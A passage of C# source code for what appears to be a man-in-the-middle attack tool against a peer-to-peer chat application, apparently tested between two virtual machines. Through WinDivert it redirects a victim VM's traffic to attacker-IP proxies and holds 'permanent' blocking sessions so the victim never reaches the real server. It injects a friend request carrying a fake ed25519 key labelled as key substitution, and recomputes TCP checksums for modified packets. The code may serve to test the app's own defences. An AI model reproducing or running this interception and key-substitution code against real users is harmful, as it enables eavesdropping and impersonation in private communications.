                LogMessage?.Invoke($"🎭 VM1 will appear to be connecting directly to {_attackerIP} proxies");

                var chatP2PPorts = new[] { 7777, 8888, 8889, 8891 };
                var vm1Tasks = new List<Task>();

                foreach (var port in chatP2PPorts)
                {
                    var task = Task.Run(async () =>
                    {
                        try
                        {
                            LogMessage?.Invoke($"🎯 VM1 SIMULATION: Attempting connection to proxy port {port}");

                            using var client = new System.Net.Sockets.TcpClient();
                            client.ReceiveTimeout = 10000;
                            client.SendTimeout = 10000;

                            // Connecter à notre proxy
                            await client.ConnectAsync(_attackerIP, port);
                            LogMessage?.Invoke($"✅ VM1 SIMULATION: Connected to proxy {_attackerIP}:{port}");

                            var stream = client.GetStream();

                            // Générer trafic ChatP2P réaliste comme si VM1 l'envoyait
                            var vm1Data = port switch
                            {
                                7777 => "FRIEND_REQ:VM1:VM2:vm1_real_key:Hello VM2 from VM1 via proxy!",
                                8888 => "MSG:VM1:VM2:Direct message from VM1 via proxy",
                                8889 => "{\"Command\":\"contacts\",\"Action\":\"get_friend_requests\",\"Data\":{\"peer_name\":\"VM1\"}}",
                                8891 => "FILE_HEADER:vm1_file.txt:1024",
                                _ => "VM1_DIRECT_CONNECTION"
                            };

                            await stream.WriteAsync(System.Text.Encoding.UTF8.GetBytes(vm1Data));
                            LogMessage?.Invoke($"📤 VM1 SIMULATION: Sent realistic VM1 data to port {port}: {vm1Data.Substring(0, Math.Min(50, vm1Data.Length))}...");

                            // Lire réponse
                            var buffer = new byte[4096];
                            var bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                            if (bytesRead > 0)
                            {
                                var response = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                LogMessage?.Invoke($"📥 VM1 SIMULATION: Received response from port {port}: {response.Substring(0, Math.Min(50, response.Length))}...");
                            }

                            // Maintenir connexion un moment
                            await Task.Delay(7000);
                            LogMessage?.Invoke($"🔄 VM1 SIMULATION: Maintained connection to port {port} - proxy now active");
                        }
                        catch (Exception ex)
                        {
                            LogMessage?.Invoke($"⚠️ VM1 SIMULATION: Failed to connect to port {port}: {ex.Message}");
                        }
                    });

                    vm1Tasks.Add(task);
                }

                await Task.WhenAll(vm1Tasks);
                LogMessage?.Invoke($"✅ VM1 SIMULATION: All VM1-like connections completed - proxies should be fully operational");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur VM1 direct simulation: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔗 Déclenche connexion proxy PERMANENTE pour port spécifique (SANS TIMEOUT)
        /// </summary>
        private async Task TriggerProxyConnectionForPortPermanent(int destPort, int srcPort)
        {
            try
            {
                LogMessage?.Invoke($"🔗 PERMANENT PROXY: Starting UNBREAKABLE session for port {destPort}");
                LogMessage?.Invoke($"🎯 OBJECTIVE: VM1 NEVER accesses real server - ONLY our proxies!");

                using var client = new System.Net.Sockets.TcpClient();
                client.ReceiveTimeout = 0; // 🚫 NO TIMEOUT - PERMANENT
                client.SendTimeout = 0;    // 🚫 NO TIMEOUT - PERMANENT

                // 🚫 NO CANCELLATION TOKEN - PERMANENT BLOCKING
                LogMessage?.Invoke($"🔄 PERMANENT: Connecting to proxy {_attackerIP}:{destPort} WITHOUT timeout...");

                // Se connecter au proxy local sur l'IP de l'attaquant
                try
                {
                    await client.ConnectAsync(_attackerIP, destPort);
                    LogMessage?.Invoke($"✅ PERMANENT PROXY: Connected to {_attackerIP}:{destPort} - UNBREAKABLE!");

                    // Simuler session ChatP2P réaliste
                    var stream = client.GetStream();

                    // 🎯 Requêtes adaptées au protocole de chaque canal
                    var singleRequest = destPort switch
                    {
                        7777 => "FRIEND_REQ:VM2:VM1:fake_ed25519_key_base64:MITM Attack Key Substitution!",
                        8888 => "MSG:VM2:VM1:Hello from PERMANENT MITM!",
                        8889 => "{\"Command\":\"contacts\",\"Action\":\"get_friend_requests\",\"Data\":{\"peer_name\":\"VM1\"}}",
                        8891 => "FILE_HEADER:mitm_test.txt:1024",
                        _ => "{\"Command\":\"permanent_mitm\",\"Action\":\"ping\",\"Data\":null}"
                    };

                    var requestData = System.Text.Encoding.UTF8.GetBytes(singleRequest);
                    await stream.WriteAsync(requestData, 0, requestData.Length);
                    LogMessage?.Invoke($"📤 PERMANENT PROXY: Initial request sent to port {destPort}");

                    // 🔄 BOUCLE PERMANENTE SANS TIMEOUT
                    LogMessage?.Invoke($"🔄 ENTERING PERMANENT LOOP: Port {destPort} now PERMANENTLY blocked!");
                    LogMessage?.Invoke($"🚫 VM1 can NEVER access real server while this runs!");

                    int loopCount = 0;
                    while (_isRunning) // Continue tant que WinDivert est actif
                    {
                        try
                        {
                            loopCount++;

                            // TCP keep-alive pour maintenir la connexion
                            client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                            // Log périodique pour confirmer que le blocage est actif
                            if (loopCount % 6 == 0) // Toutes les minutes (10s * 6)
                            {
                                LogMessage?.Invoke($"🔒 PERMANENT BLOCK ACTIVE: Port {destPort} - Loop #{loopCount} - VM1 CANNOT escape!");
                            }

                            // Attendre 10 secondes avant prochaine vérification
                            await Task.Delay(10000); // 10 secondes - pas de CancellationToken!
                        }
                        catch (Exception loopEx)
                        {
                            LogMessage?.Invoke($"⚠️ PERMANENT LOOP WARNING port {destPort}: {loopEx.Message} - RESTARTING...");

                            // Si erreur dans la boucle, on recommence avec une nouvelle connexion
                            break; // Sort de la boucle while, va dans le catch externe qui va restart
                        }
                    }

                    LogMessage?.Invoke($"🔚 PERMANENT PROXY: Session ended for port {destPort} (WinDivert stopped)");
                }
                catch (Exception connectEx)
                {
                    LogMessage?.Invoke($"❌ PERMANENT PROXY: Connection to {_attackerIP}:{destPort} failed: {connectEx.Message}");
                    LogMessage?.Invoke($"🔄 PERMANENT PROXY: Will retry connection automatically...");

                    // Si connexion échoue, attendre puis retry automatiquement
                    await Task.Delay(5000); // 5 secondes puis retry

                    // Récursif: restart automatiquement la connexion permanente
                    if (_isRunning)
                    {
                        LogMessage?.Invoke($"🔄 PERMANENT PROXY: Auto-restarting connection to port {destPort}...");
                        await TriggerProxyConnectionForPortPermanent(destPort, srcPort); // Retry
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ PERMANENT PROXY CRITICAL ERROR port {destPort}: {ex.Message}");

                // Même en cas d'erreur critique, on restart automatiquement
                if (_isRunning)
                {
                    LogMessage?.Invoke($"🔄 PERMANENT PROXY: Critical restart for port {destPort} in 3 seconds...");
                    await Task.Delay(3000);
                    await TriggerProxyConnectionForPortPermanent(destPort, srcPort); // Restart critique
                }
            }
        }

        /// <summary>
        /// 🔧 Recalcule TCP checksum avec pseudo-header (implémentation complète)
        /// </summary>
        private void RecalculateTCPChecksum(byte[] packet, int length, int ipHeaderLen)
        {
            try
            {
                // TCP header commence après IP header
                int tcpOffset = ipHeaderLen;
                int tcpLength = length - ipHeaderLen;

                if (tcpLength < 20)
                {
                    LogMessage?.Invoke($"⚠️ TCP header trop petit: {tcpLength} bytes");
                    return;
                }

                // Reset TCP checksum
                packet[tcpOffset + 16] = 0;
                packet[tcpOffset + 17] = 0;

                // Extraire IPs pour pseudo-header
                var srcIP = new byte[] { packet[12], packet[13], packet[14], packet[15] };
                var dstIP = new byte[] { packet[16], packet[17], packet[18], packet[19] };

                LogMessage?.Invoke($"🔧 TCP checksum calculation:");
                LogMessage?.Invoke($"   Source IP: {srcIP[0]}.{srcIP[1]}.{srcIP[2]}.{srcIP[3]}");
                LogMessage?.Invoke($"   Dest IP: {dstIP[0]}.{dstIP[1]}.{dstIP[2]}.{dstIP[3]}");
                LogMessage?.Invoke($"   TCP Length: {tcpLength}");

                // Calculer TCP checksum avec pseudo-header
                uint sum = 0;

                // Pseudo-header: Src IP (4 bytes)
                sum += (uint)((srcIP[0] << 8) + srcIP[1]);
                sum += (uint)((srcIP[2] << 8) + srcIP[3]);

                // Pseudo-header: Dst IP (4 bytes)
                sum += (uint)((dstIP[0] << 8) + dstIP[1]);
                sum += (uint)((dstIP[2] << 8) + dstIP[3]);

                // Pseudo-header: Protocol (TCP = 6) + TCP Length
                sum += 6; // TCP protocol
                sum += (uint)tcpLength;

                // TCP header + data
                for (int i = tcpOffset; i < length; i += 2)
                {
                    if (i + 1 < length)
                        sum += (uint)((packet[i] << 8) + packet[i + 1]);
                    else
                        sum += (uint)(packet[i] << 8); // Dernier byte impair
                }

                // Fold carry bits
                while ((sum >> 16) != 0)
                {
                    sum = (sum & 0xFFFF) + (sum >> 16);
                }

                // Complément à 1
                sum = ~sum;

                // Stocker TCP checksum
                packet[tcpOffset + 16] = (byte)(sum >> 8);
                packet[tcpOffset + 17] = (byte)(sum & 0xFF);

                LogMessage?.Invoke($"✅ TCP checksum recalculé: 0x{packet[tcpOffset + 16]:X2}{packet[tcpOffset + 17]:X2}");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur TCP checksum: {ex.Message}");
            }
        }

        /// <summary>
        /// 🧹 Nettoie les tâches terminées pour éviter les fuites mémoire
        /// </summary>
        private void CleanupCompletedTasks()
        {
            try
            {
                var completedTasks = _activeTasks.Where(t => t.IsCompleted || t.IsCanceled || t.IsFaulted).ToList();
                foreach (var task in completedTasks)
                {
                    _activeTasks.Remove(task);
                    task.Dispose();
                }

                if (completedTasks.Count > 0)
                {
                    LogMessage?.Invoke($"🧹 Cleaned up {completedTasks.Count} completed proxy tasks");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"⚠️ Cleanup warning: {ex.Message}");
            }
        }

        public void StopInterception()
        {
            try
            {
                LogMessage?.Invoke("⏹️ Stopping WinDivert interceptor...");

                _isRunning = false;
                _cancellationToken?.Cancel();

                // Wait for active tasks to complete with timeout
                LogMessage?.Invoke("🔄 Waiting for active proxy tasks to complete...");
                var waitTask = Task.WhenAll(_activeTasks.Where(t => !t.IsCompleted).ToArray());
                if (!waitTask.Wait(TimeSpan.FromSeconds(5)))
                {
                    LogMessage?.Invoke("⚠️ Some proxy tasks didn't complete within timeout - forcing cleanup");
                }

                // Cleanup all tasks
                CleanupCompletedTasks();
                _activeTasks.Clear();

                // Dispose semaphore
                _proxyConnectionSemaphore?.Dispose();

                if (_handle != IntPtr.Zero)
                {
                    bool closed = WinDivertClose(_handle);
                    if (closed)
                    {
                        LogMessage?.Invoke("✅ WinDivert handle closed successfully");
                    }
                    else
                    {
                        var error = Marshal.GetLastWin32Error();
                        LogMessage?.Invoke($"⚠️ WinDivert close warning: Error {error}");
                    }
                    _handle = IntPtr.Zero;
                }

                LogMessage?.Invoke($"📊 Final stats: Total={_packetCount}, Intercepted={_interceptedCount}, Modified={_modifiedCount}");
                LogMessage?.Invoke("⏹️ WinDivert interceptor stopped");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt WinDivert: {ex.Message}");
            }
        }

        public bool IsRunning => _isRunning;

        private string GetErrorDescription(int error)
        {
            return error switch
            {
                5 => "Access Denied (run as admin)",
                2 => "File Not Found (missing driver)",
                6 => "Handle Closed",
                87 => "Invalid Parameter",
                995 => "Operation Aborted",
                1275 => "Driver Blocked",
                _ => $"Unknown error {error}"
            };
        }

        private string GetProtocolName(byte protocol)
        {
            return protocol switch
            {
                1 => "ICMP",
                6 => "TCP",
                17 => "UDP",
                _ => $"Protocol {protocol}"
            };
        }

        #region WinDivert P/Invoke - Signatures Corrigées

        [DllImport("WinDivert.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        private static extern IntPtr WinDivertOpen([MarshalAs(UnmanagedType.LPStr)] string filter,
                                                   WinDivertLayer layer,
                                                   short priority,
                                                   ulong flags);

        [DllImport("WinDivert.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        private static extern bool WinDivertRecv(IntPtr handle,
                                                byte[] packet,
                                                uint packetLen,
                                                ref uint readLen,
                                                ref WinDivertAddress addr);

        [DllImport("WinDivert.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        private static extern bool WinDivertSend(IntPtr handle,
                                                byte[] packet,
                                                uint packetLen,
                                                ref uint writeLen,
                                                ref WinDivertAddress addr);

        [DllImport("WinDivert.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        private static extern bool WinDivertClose(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        private struct WinDivertAddress
        {
            public ulong Timestamp;
            public uint IfIdx;
            public uint SubIfIdx;
            public byte Direction;
        }

        private enum WinDivertLayer
        {
            WINDIVERT_LAYER_NETWORK = 0,
            WINDIVERT_LAYER_NETWORK_FORWARD = 1
        }

        #endregion
    }
}